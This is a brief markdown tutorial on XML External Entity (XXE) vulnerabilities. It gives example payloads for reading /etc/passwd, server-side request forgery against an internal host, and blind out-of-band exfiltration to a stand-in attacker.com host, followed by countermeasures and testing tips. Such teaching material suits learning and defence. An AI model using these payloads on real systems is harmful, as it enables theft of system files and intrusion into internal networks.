# XML eXternal Entities Vulnerability

XXE is a web security vulnerability that allows an attacker to interfere with an application's processing of XML data. (Can be used to to disclose various configuration file information, which the attackers then use to exploit the system further)

### What are XML External Entities
- External entity profiles are defined by outside sources such as a file on a local computer or a web URL. Such entities are used to ensure that the XML processor behaves consistently even when unexpected characters are parsed.

## XXE Attack 
- XXE vulnerabilities as uploading an XML file that includes an external entity.
```xml
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo
```


## Types of XXE Attacks: 

- XXE for File Retrieval
	- ```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<product>&xxe;</product>
<adress>&xxe;</adress>
```
	- Defining a new Entity called ```xxe```. This entity is made to execute a system call.
- XXE for Server-Side Request Forgery 
	- ```xml 
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internals.target.com"> ]>```
	- System call to an HTTP endpoint of an internal webserver of which we should not see the contents from outside.
- Data out-of-band exfiltration (Blind XXE)
	- ```xml
	<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://Attacker.com"> ]>```
	- Make a callback to our server.
	- ```
	<!ENTITY % file SYSTEM "file:///etc/passwd">
	<!ENTITY % evil "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker.com/?x=%file;'>">
	%evil;
	%exfiltrate;
	```



***


## Countermeasures:

- Use simple data formats. (JSON as example)
- Use updated XML processes and libraries.
- Disable Document Type Definition and XXE in all XML Parsers.
- Usage of Whitelisting for Server-Side Input Validation.

***

## Takeaways: 

- It'simportant to insert your XXE entity into every single XML element. Any of them can be vulnerable as the developer has to filter ALL the fields indivually.
- Trying to upload a file that will test for XXE on every entry point where an XML
is processed
- Look into for SVG/DOC/XLSX & SOAP requests.

